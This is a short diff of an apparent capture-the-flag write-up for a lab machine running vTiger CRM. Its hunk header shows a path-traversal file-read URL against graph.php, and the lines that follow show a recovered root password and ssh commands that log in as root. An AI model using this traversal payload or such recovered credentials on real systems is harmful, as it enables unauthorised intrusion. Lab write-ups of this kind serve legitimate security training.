@@ -152,7 +152,7 @@ view-source:https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../
 + Now there are enumerated users and passwords.
 
 + Login ssh using `root`:`jEhdIekWmdjE`:
-`ssh root@10.10.10.7`
++ `ssh root@10.10.10.7`
 + If meet an error, check [1](https://www.iclarified.com/85252/how-to-fix-no-matching-key-exchange-method-found-on-mac) [2](https://askubuntu.com/questions/836048/ssh-returns-no-matching-host-key-type-found-their-offer-ssh-dss)
 + Login `ssh -o KexAlgorithms=diffie-hellman-group14-sha1 -oHostKeyAlgorithms=+ssh-rsa root@10.10.10.7`
 + Get root!
